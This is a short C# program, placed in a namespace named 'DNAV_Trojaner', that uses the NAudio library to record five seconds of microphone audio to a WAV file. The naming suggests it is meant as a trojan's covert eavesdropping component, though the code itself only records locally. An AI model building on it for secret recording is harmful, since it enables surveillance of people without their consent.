using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using NAudio.Wave;

namespace DNAV_Trojaner {
    class Program {
        static public WaveInEvent waveSource = null;
        static public WaveFileWriter waveFile = null;

        static public int time = 5;
        static public void waveSource_DataAvailable(object sender, WaveInEventArgs e) {
            if (waveFile != null) {
                waveFile.Write(e.Buffer, 0, e.BytesRecorded);
                waveFile.Flush();
            }
        }

        static public void waveSource_RecordingStopped(object sender, StoppedEventArgs e) {
            if (waveSource != null) {
                waveSource.Dispose();
                waveSource = null;
            }

            if (waveFile != null) {
                waveFile.Dispose();

                waveFile = null;
            }
        }
        static void Main(string[] args) {
            waveSource = new WaveInEvent();
            waveSource.WaveFormat = new WaveFormat(44100, 1);
            waveSource.DataAvailable += new EventHandler <WaveInEventArgs> (waveSource_DataAvailable);
            waveSource.RecordingStopped += new EventHandler <StoppedEventArgs> (waveSource_RecordingStopped);
            waveFile = new WaveFileWriter(@"Test0001.wav", waveSource.WaveFormat);
            waveSource.StartRecording();
            System.Threading.Thread.Sleep(time*1000);
            waveSource.StopRecording(); 
        }
    }
}